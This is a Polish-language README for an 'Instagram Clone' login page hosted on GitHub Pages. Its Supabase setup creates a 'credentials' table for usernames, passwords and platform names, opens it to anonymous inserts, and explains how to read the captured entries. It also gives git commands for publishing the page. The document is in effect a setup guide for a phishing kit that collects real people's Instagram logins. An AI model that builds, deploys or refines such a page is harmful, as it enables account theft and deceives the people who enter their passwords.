# Instagram Clone (GitHub Pages Ready)

Ten projekt jest gotowy do wdrożenia na GitHub Pages i używa Supabase do zapisywania danych.

## 1. Konfiguracja Supabase

Aby formularz logowania działał i zapisywał dane, musisz utworzyć tabelę w swojej bazie danych Supabase.

1. Zaloguj się do [Supabase](https://supabase.com/).
2. Wejdź w **SQL Editor** w swoim projekcie.
3. Wklej i uruchom poniższy kod SQL, aby utworzyć tabelę `credentials`:

```sql
-- Tworzenie tabeli
create table credentials (
  id bigint generated by default as identity primary key,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  username text,
  password text,
  platform text,
  timestamp text
);

-- Włączenie RLS (Row Level Security) - opcjonalne, ale zalecane
alter table credentials enable row level security;

-- Utworzenie polityki pozwalającej każdemu na dodawanie wpisów (INSERT)
create policy "Enable insert for anon" on credentials for insert with check (true);

-- Jeśli chcesz widzieć dane w dashboardzie Supabase, musisz też dodać politykę SELECT (tylko dla zalogowanych adminów lub wyłącz RLS)
-- Najprościej na start: wyłącz RLS w ustawieniach tabeli w Dashboardzie jeśli masz problemy z podglądem danych.
```

## 2. Wdrożenie na GitHub Pages

1. **Utwórz nowe repozytorium** na GitHub.
2. **Wgraj pliki** z tego folderu do repozytorium (możesz użyć GitHub Desktop lub linii komend):
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://github.com/TWOJA-NAZWA-UZYTKOWNIKA/NAZWA-REPOZYTORIUM.git
   git push -u origin main
   ```
3. Po wgraniu plików, wejdź w **Settings** (Ustawienia) repozytorium na GitHub.
4. Przejdź do zakładki **Pages** (w menu po lewej).
5. W sekcji **Build and deployment** -> **Branch**, wybierz `main` i folder `/(root)`.
6. Kliknij **Save**.

Po kilku minutach Twoja strona będzie dostępna pod adresem: `https://TWOJA-NAZWA-UZYTKOWNIKA.github.io/NAZWA-REPOZYTORIUM/`

## 3. Ważne uwagi

- **Supabase URL i Key** są już wpisane w pliku `index.html`.
- Upewnij się, że w Supabase w zakładce **Authentication -> URL Configuration** dodałeś adres swojej strony na GitHub Pages do **Site URL** i **Redirect URLs** (choć przy prostym `insert` nie jest to zawsze wymagane, warto to zrobić).
